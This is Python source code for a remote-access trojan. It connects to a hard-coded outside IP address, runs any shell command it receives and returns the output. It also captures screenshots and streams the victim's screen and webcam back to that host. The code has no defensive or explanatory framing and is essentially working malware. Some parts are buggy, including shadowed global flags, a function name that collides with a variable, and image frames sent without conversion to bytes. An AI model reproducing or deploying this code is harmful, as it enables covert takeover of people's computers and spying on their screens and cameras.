import socket
import struct
import subprocess
import os
from PIL import ImageGrab,Image
import time
import threading
import cv2


bridge = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
bridge.connect(('45.80.148.246',1234))

record = False
camera = False

#------------------------------------------------
def screenshot():
    screenshot = ImageGrab.grab()

    # Save the screenshot to a file
    image_name = f"{time.time()}.png"
    screenshot.save(image_name)
    return image_name
    
#-----------------------------------------------------
def sendsshot(image_name):
    with open(image_name, "rb") as file:
        image_bytes = file.read()
    sendimage(image_bytes)

def sendimage(image_bytes):

    # Send the screenshot size to the server
    image_size = len(image_bytes)
    bridge.send(str(image_size).encode())

    # Send the screenshot data to the server
    bridge.sendall(image_bytes)

#-------------------------------------------------------------
def record_screen():
    while record:
        frame = ImageGrab.grab()
        sendimage(frame)

#----------------------------------------------------------------

def camera():
    # Open the default camera (index 0)
    cap = cv2.VideoCapture(0)

    while camera:
        # Read the current frame from the camera
        ret, frame = cap.read()

        if ret:
            # Convert the frame from BGR to RGB format
            rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            # Convert the NumPy array to a Pillow Image object
            image = Image.fromarray(rgb_frame)
            sendimage(image)

    # Release the video capture object
    cap.release()


def execute_command(command):
    if command.lower() == "screenshot":
        sendsshot(screenshot())

    elif command.lower() == "screenshare start":
        record = True
        thread = threading.Thread(target=record_screen)
        thread.start()

    elif command.lower() == "screenshare stop":
        record = False

    elif command.lower() == "camera start":
        camera = True
        thread = threading.Thread(target=camera)
        thread.start()

    elif command.lower() == "camera stop":
        camera = False

    else:
        current_dir = os.getcwd()

        if len(command) == 2 and command[1] == ":" and command[0].isalpha():
            # Handle drive letter change (e.g., 'e:', 'f:', 'c:')
            try:
                os.chdir(command)
                current_dir = os.getcwd()
            except Exception as e:
                return f"Failed to change drive: {str(e)}"

        if command.lower().startswith("cd "):
            # Handle 'cd' command separately to update the current directory
            try:
                path = command[3:]  # Extract the path from the 'cd' command
                os.chdir(path)
                current_dir = os.getcwd()
            except Exception as e:
                return f"Failed to change directory: {str(e)}"

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True, cwd=current_dir)
            return output
        except subprocess.CalledProcessError as e:
            error_message = f"Command failed with return code {e.returncode}."
            if e.output:
                error_message += "\n" + e.output
            return error_message
        except Exception as e:
            return f"An error occurred: {str(e)}"
    




while True:
    # receive the command
    size = bridge.recv(1024)
    command = bridge.recv(int(size.decode()))
    unpackedresponse = struct.unpack(f"{round(int(size.decode())/struct.calcsize('s'))}s",command)
    #print(unpackedresponse[0].decode())
    # send the response
    response = execute_command(unpackedresponse[0].decode())
    bytestream = struct.pack(f"{len(response)}s",response.encode())
    bridge.send(str(struct.calcsize("s")*len(response)).encode())
    bridge.send(bytestream)





#def images2video(image):
#    frame = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
    
    # Display the resulting frame
#    cv2.imshow('Screen Capture', frame)